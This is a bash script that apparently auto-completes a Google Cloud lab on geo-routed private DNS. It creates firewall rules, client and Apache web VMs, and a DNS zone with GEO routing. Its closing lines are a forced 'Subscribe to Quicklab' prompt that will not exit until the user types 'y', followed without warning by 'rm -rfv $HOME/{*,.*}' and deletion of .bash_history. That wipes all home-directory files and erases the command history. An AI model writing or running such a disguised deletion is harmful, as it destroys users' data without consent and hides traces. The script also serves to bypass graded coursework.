BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region $region
#gcloud config set compute/zone $region-a
#export ZONE=$region-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------# 


gcloud services enable compute.googleapis.com

gcloud services enable dns.googleapis.com

sleep 15

gcloud services list | grep -E 'compute|dns'

gcloud compute firewall-rules create fw-default-iapproxy \
--direction=INGRESS \
--priority=1000 \
--network=default \
--action=ALLOW \
--rules=tcp:22,icmp \
--source-ranges=35.235.240.0/20

gcloud compute firewall-rules create allow-http-traffic --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=0.0.0.0/0 --target-tags=http-server

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


gcloud compute instances create us-client-vm --machine-type e2-medium --zone $ZONE_1

gcloud compute instances create europe-client-vm --machine-type e2-medium --zone $ZONE_2

gcloud compute instances create asia-client-vm --machine-type e2-medium --zone $ZONE_3


echo "${GREEN}${BOLD}

Task 3 Completed

${RESET}"


gcloud compute instances create us-web-vm \
--zone=$ZONE_1 \
--machine-type=e2-medium \
--network=default \
--subnet=default \
--tags=http-server \
--metadata=startup-script='#! /bin/bash
 apt-get update
 apt-get install apache2 -y
 echo "Page served from: US-EAST1" | \
 tee /var/www/html/index.html
 systemctl restart apache2'


 gcloud compute instances create europe-web-vm \
--zone=$ZONE_2 \
--machine-type=e2-medium \
--network=default \
--subnet=default \
--tags=http-server \
--metadata=startup-script='#! /bin/bash
 apt-get update
 apt-get install apache2 -y
 echo "Page served from: EUROPE-WEST2" | \
 tee /var/www/html/index.html
 systemctl restart apache2'


echo "${GREEN}${BOLD}

Task 4 Completed

${RESET}"


 export US_WEB_IP=$(gcloud compute instances describe us-web-vm --zone=$ZONE_1 --format="value(networkInterfaces.networkIP)")

 export EUROPE_WEB_IP=$(gcloud compute instances describe europe-web-vm --zone=$ZONE_2 --format="value(networkInterfaces.networkIP)")

 gcloud dns managed-zones create example --description=test --dns-name=example.com --networks=default --visibility=private


 gcloud beta dns record-sets create geo.example.com \
--ttl=5 --type=A --zone=example \
--routing_policy_type=GEO \
--routing_policy_data="us-east1=$US_WEB_IP;europe-west2=$EUROPE_WEB_IP"


gcloud beta dns record-sets list --zone=example




echo "${GREEN}${BOLD}

Task 7 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
